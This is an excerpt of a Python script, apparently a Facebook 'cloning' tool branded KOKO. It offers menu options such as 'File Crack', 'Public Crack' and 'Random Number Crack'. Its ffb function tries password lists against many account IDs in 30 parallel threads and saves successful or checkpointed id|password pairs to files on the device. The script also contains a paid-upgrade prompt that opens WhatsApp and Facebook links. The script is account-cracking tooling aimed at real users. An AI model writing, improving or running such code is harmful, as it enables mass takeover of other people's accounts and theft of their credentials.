...
os.system('xdg-open https://facebook.com/groups/afthzofsohaqueen/')
print('\n\033[1;97m [•] Checking Update 10.5 \n Wait A Few Seconds...')
...
logo =                                          ("""   
    ...
    \033[1;90m          # # # # # # # #
    \033[1;94m    # # #### # # #### 
             \033[41m\033[1;37m[THE]   [BRAND]   [GIRL]   [KOKO]\x1b[0m
- - - - - - - - - - - - - - - - - - - - - - - - 
\33[1;32m╠══[Author   : KOKO-BRAND
\33[1;35m╠══[FACEBOOK : NIDA KHAN
\33[1;31m╠══[GITHUB   : TECH-KOKO
\33[1;90m╠══[NETWORK  : \33[1;90mSPEED 4G \33[1;93m
\33[1;94m╠══[TOOLS    : \33[1;94mMIX-CLONING \33[1;94m
\33[1;97m╠══[VERSION  : \33[1;97m11.4 \33[1;97m
\33[1;37m- - - - - - - - - - - - - - - - - - - - - - - -  """)                
def linex():
        print('\033[1;97m----------------------------------------------')
...
def public():
        ...
        try:
                ...
                print('\033[1;31mYour Cookies  Expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;31mYour Cookies Expired...');time.sleep(1)
                login()
        try:
                ...
                login()
        try:
                jum=int(input(' \033[1;36mHow Many Ids You Want To Clone ?\033[1;97m '))
        except ValueError:
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print('Total Accounts : \033[1;97m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;97mMethod -> \033[1;97mM{mthd}')
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' Put File Example:  /sdcard/Shani.txt  Etc..')
                                linex()
                                ...
                                os.system(f'xdg-open https://facebook.com/Shahnoor.780');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://facebook.com/Shahnoor.780');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://facebook.com/Shahnoor.780');menu()
                        elif xd in ['0','00']:
                        ...
                        linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mPaid\033[1;97m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File Crack\n [+] Create Ids File\n [+] Public Crack\n [+] Random Number Crack\n [+] Random Gmail Crack\n [+] Exit Menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;97m)')
                        linex()
                        input(" Choose Option : ")
                        linex()
                        print(" Your Subscription Date Expire")
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923107790706&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi KOKO Sir, I Need To Buy Your Paid Sk PRO Tools Version 1.0.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python KOKO.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[KOKO-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Sk:
                                ...
                                if 'y' in pcp:
                                        print('\r\033[1;91m KOKO-CP '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/SHAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\033[1;91m KOKO-CP '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SHAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/SHAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        open('/sdcard/SHAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
